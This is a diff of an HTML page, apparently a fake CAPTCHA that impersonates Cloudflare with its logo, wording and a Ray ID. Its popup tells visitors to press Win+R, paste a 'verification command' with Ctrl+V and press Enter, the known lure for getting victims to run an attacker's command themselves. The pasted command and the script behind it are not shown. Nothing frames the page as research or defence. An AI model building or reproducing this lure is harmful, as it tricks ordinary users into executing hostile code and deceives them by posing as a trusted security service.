@@ -3,46 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title id="page-title">Verifying...</title>
-    <link rel="stylesheet" href="styles.css">
+    <title>Verifying you are human...</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-    <!-- CAPTCHA Container -->
-    <div class="container">
-        <h1 id="domain-name"></h1>
+    <div id="captcha-container">
+        <h1 id="domain-name">Loading...</h1>
         <p>Verifying you are human. This may take a few seconds.</p>
 
-        <div class="captcha-box">
-            <input type="checkbox" id="captcha" onclick="verifyCaptcha()">
-            <label for="captcha">
-                <div class="checkbox-ui">
-                    <div class="spinner" id="verify-spinner"></div>
-                </div>
-                <span>Verify you are human</span>
-                <img src="cloudflare.png" alt="Cloudflare Logo" id="cf-logo">
-                <span class="cf-text">Privacy - Terms</span>
+        <div id="captcha-box">
+            <input type="checkbox" id="fake-captcha">
+            <label for="fake-captcha">
+                <span id="captcha-text">Verify you are human</span>
+                <img src="cloudflare.png" alt="Cloudflare Logo">
             </label>
         </div>
 
-        <p class="security-text">
-            <span id="security-msg"></span>
-        </p>
+        <p id="security-text">This site needs to review the security of your connection before proceeding.</p>
+        <div id="spinner" class="hidden"></div>
     </div>
 
-    <!-- Instructional Popup -->
-    <div id="instruction-popup">
-        <div class="popup-content">
+    <div id="popup" class="hidden">
+        <div id="popup-content">
             <h2>Security by Cloudflare</h2>
-            <p><strong>Verification Steps:</strong></p>
+            <p><b>Verification steps</b></p>
             <ol>
-                <li>Press <strong>Windows Key + R</strong></li>
-                <li>Press <strong>Ctrl + V</strong> to paste the verification command</li>
-                <li>Press <strong>Enter</strong> to complete verification</li>
+                <li>Press & hold <b>Win + R</b></li>
+                <li>Press <b>Ctrl + V</b> in the verification window</li>
+                <li>Press <b>Enter</b></li>
             </ol>
-            <button onclick="closePopup()">VERIFY</button>
+            <p id="verify-id">Verification ID: <span id="ray-id"></span></p>
+            <button id="verify-btn">VERIFY</button>
         </div>
     </div>
+
+    <footer>
+        Ray ID: <span id="footer-ray-id"></span>
+        <br>Performance & security by Cloudflare
+    </footer>
 
     <script src="script.js"></script>
 </body>
